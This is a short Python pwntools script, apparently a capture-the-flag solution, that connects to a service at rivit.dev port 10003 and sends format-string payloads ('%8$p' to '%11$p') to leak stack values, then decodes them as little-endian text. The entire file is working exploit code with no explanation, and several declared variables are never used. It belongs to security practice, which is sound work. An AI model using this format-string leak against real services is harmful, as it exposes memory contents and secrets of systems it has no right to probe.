from pwn import *
import time
import traceback

# https://es7evam.gitbook.io/security-studies/exploitation/sockets/03-connections-with-pwntools

def convert_to_string(s):
    if s[:2] == b'0x': s = s[2:]
    s = s.strip()
    if len(s) % 2: s = b'0' + s
    big = bytearray.fromhex(str(s, 'utf-8'))
    big.reverse()
    little = ''.join(f"{n:02X}" for n in big)
    little = bytearray.fromhex(little).decode()
    return little

context.binary = binary = ELF("./task.tar/task")

line1_x = b""
line2_x = b""

line1 = b""
line2 = b""

points = []

exceptions = set()
uh = []
output = []


for i in range(8,12):
    print(i)
    time.sleep(0.5)
    format_string = b"".join([b"%" + str(i).encode("utf-8") + b"$p"])

    conn = remote('rivit.dev',10003)
    conn.recvuntil("tag? ")
    conn.sendline(format_string)

    try:
        line1_tmp = conn.recvall()
        s = convert_to_string(line1_tmp)
        print("output", s)
    except Exception:
        pass

    conn.close()

print(points)

print(b''.join(uh))

print()

print(''.join(output))
